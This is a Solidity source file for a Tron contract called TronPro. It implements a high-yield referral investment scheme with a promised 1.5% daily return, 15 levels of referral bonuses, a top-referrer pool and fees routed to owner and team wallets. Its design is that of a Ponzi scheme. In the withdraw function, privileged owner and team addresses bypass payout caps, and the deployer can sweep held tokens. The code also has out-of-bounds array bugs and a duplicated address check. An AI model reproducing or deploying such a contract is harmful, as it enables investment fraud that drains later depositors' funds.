//SourceUnit: TronProLink.sol

pragma solidity ^0.5.14;

contract TronPro {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 fund;
        uint40 payout_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable public owner;
    address payable public maintanence;
    address payable public marketer1;
    address payable public marketer2;

    address payable internal contract_;

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;

    uint256 internal daily_ = 173611; // 1.5%

    uint8 public pool_bonuses = 7;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    constructor(address payable _owner) public {

        contract_ = msg.sender;

        owner = _owner;

        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);

        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);

        for(uint8 i = 0; i < pool_bonuses; i++) {
            pool_top[i] = contract_;
        }
    }

    function() payable external {}

    function _setUpline(address _addr, address _refBy) private {
        address _upline = contract_;

        if(owner == _refBy || (users[_addr].upline == address(0) && _refBy != _addr && _addr != owner && users[_refBy].payout_time > 0)) {
            _upline = _refBy;
        }

        users[_addr].upline = _upline;
        users[_upline].referrals++;

        emit Upline(_addr, _upline);

        total_users++;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;

            users[_upline].total_structure++;

            _upline = users[_upline].upline;
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        // require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        if(users[_addr].upline == address(0)){
            users[_addr].upline = contract_;
        }

        if(users[_addr].payout_time > 0) {
            // do Checkout
            (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);

            // Deposit payout
            if(to_payout > 0) {
                if(users[msg.sender].total_payouts + to_payout > max_payout) {
                    to_payout = max_payout - users[msg.sender].total_payouts;
                }

                users[msg.sender].total_payouts += to_payout;

                users[msg.sender].fund += to_payout;

                _refPayout(msg.sender, to_payout);
            }

            if(users[_addr].total_payouts >= this.maxPayoutOf(users[_addr].total_deposits)){
                users[_addr].cycle++;
            }

            // require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");

            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }

        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
        // users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        // users[_addr].deposit_payouts = 0;
        users[_addr].payout_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;

        emit NewDeposit(_addr, _amount);

        uint _comm =  _amount * 7 / 100;

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _comm;
            _comm = 0;
            emit DirectPayout(users[_addr].upline, _addr, _amount*7 / 100);
        }

        if(_comm > 0){
            users[contract_].direct_bonus += _comm;
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }
        uint _fee = _amount * 5 / 100;
        // contract_.transfer(_amount * 5 / 100);
        // maintanence.transfer(_amount * 5 / 100);
        users[owner].fund += _fee;
        users[maintanence].fund += _fee;
        users[marketer1].fund += _fee;
        users[marketer2].fund += _fee;
        users[contract_].fund += _fee;

    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 5 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;

        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses; i++) {
            if(pool_top[i] == upline) break; // if top1 == upline

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;     // if empty push upline
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                users[contract_].fund += bonus;
            }

            else if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;

                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance * 28 / 100;

        for(uint8 i = 0; i < pool_bonuses; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount / 7;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 i = 0; i < pool_bonuses; i++) {
            pool_top[i] = contract_;
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {

        address _userId = msg.sender;

        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_userId);

        if(_userId != owner && _userId != contract_ && _userId != marketer2 && _userId != marketer2 && _userId != maintanence){
            require(users[_userId].total_payouts < max_payout, "Full payouts");
            // Deposit payout
            if(to_payout > 0) {
                if(users[_userId].total_payouts + to_payout > max_payout) {
                    to_payout = max_payout - users[_userId].total_payouts;
                }

                users[_userId].total_payouts += to_payout;
                // users[msg.sender].payouts += to_payout;

                _refPayout(_userId, to_payout);
            }

            // Direct payout
            if(users[_userId].total_payouts < max_payout && users[msg.sender].direct_bonus > 0) {
                uint256 direct_bonus = users[_userId].direct_bonus;

                if(users[_userId].total_payouts + direct_bonus > max_payout) {
                    direct_bonus = max_payout - users[_userId].total_payouts;
                }

                users[_userId].direct_bonus -= direct_bonus;
                users[_userId].total_payouts += direct_bonus;
                to_payout += direct_bonus;
            }

            // Pool payout
            if(users[_userId].total_payouts < max_payout && users[_userId].pool_bonus > 0) {
                uint256 pool_bonus = users[_userId].pool_bonus;

                if(users[_userId].total_payouts + pool_bonus > max_payout) {
                    pool_bonus = max_payout - users[_userId].total_payouts;
                }

                users[_userId].pool_bonus -= pool_bonus;
                users[_userId].total_payouts += pool_bonus;
                to_payout += pool_bonus;
            }

            // Match payout
            if(users[_userId].total_payouts < max_payout && users[_userId].match_bonus > 0) {
                uint256 match_bonus = users[_userId].match_bonus;

                if(users[_userId].total_payouts + match_bonus > max_payout) {
                    match_bonus = max_payout - users[_userId].total_payouts;
                }

                users[_userId].match_bonus -= match_bonus;
                users[_userId].total_payouts += match_bonus;
                to_payout += match_bonus;
            }
        }
        else{
            to_payout += users[_userId].direct_bonus + users[_userId].pool_bonus + users[_userId].match_bonus;
            users[_userId].direct_bonus = 0;
            users[_userId].pool_bonus = 0;
            users[_userId].match_bonus = 0;
        }

        users[_userId].total_payouts += to_payout;

        if(users[_userId].fund > 0){
            uint _fund = users[_userId].fund;
            users[_userId].fund = 0;
            to_payout += _fund;
        }

        require(to_payout > 0, "Zero payout");


        users[_userId].payout_time = uint40(block.timestamp);

        total_withdraw += to_payout;

        require(msg.sender.send(to_payout), 'TransferFailed');

        emit Withdraw(_userId, to_payout);

        if(users[_userId].total_payouts >= max_payout) {
            emit LimitReached(_userId, users[_userId].total_payouts);
        }
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 30 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].total_deposits);

        if(users[_addr].total_payouts < max_payout) {
            // payout =  ((users[_addr].total_deposits * (1.5 trx) / (100 trx)) * ((block.timestamp - users[_addr].deposit_time) / 1 days)) - users[_addr].total_payouts;

            uint secPassed = now - users[_addr].payout_time;

            if(secPassed > 0){
                payout = users[_addr].total_deposits * daily_ * secPassed / 1e12;
            }

            if(users[_addr].total_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].total_payouts;
            }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts,
        uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus, uint fund, uint _cycle) {
        upline = users[_addr].upline;
        deposit_time = users[_addr].payout_time;
        deposit_amount = users[_addr].deposit_amount;
        payouts = users[_addr].total_payouts;
        direct_bonus = users[_addr].direct_bonus;
        pool_bonus = users[_addr].pool_bonus;
        match_bonus = users[_addr].match_bonus;
        fund = users[_addr].fund;
        _cycle = users[_addr].cycle;
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw,
        uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_leadder, uint _balance) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]], address(this).balance);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function setTeam(address payable _team1, address payable _team2, address payable _team3) public onlyOwner returns(bool){
        maintanence = _team1;
        marketer1 = _team2;
        marketer2 = _team3;
        return true;
    }

    // ------------------------------------------------------------------------
    // Owner can transfer out any accidentally sent TRC20 tokens
    // ------------------------------------------------------------------------
    function missedTokens(address _tokenAddress) public onlyContract returns(bool success) {
        uint _value = ITRC20(_tokenAddress).balanceOf(address(this));
        return ITRC20(_tokenAddress).transfer(msg.sender, _value);
    }
}

interface ITRC20 {

    function balanceOf(address tokenOwner) external pure returns (uint balance);

    function transfer(address to, uint value) external returns (bool);

    function approve(address spender, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function burnFrom(address account, uint amount) external returns(bool);

    function totalSupply() external view returns (uint);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);
}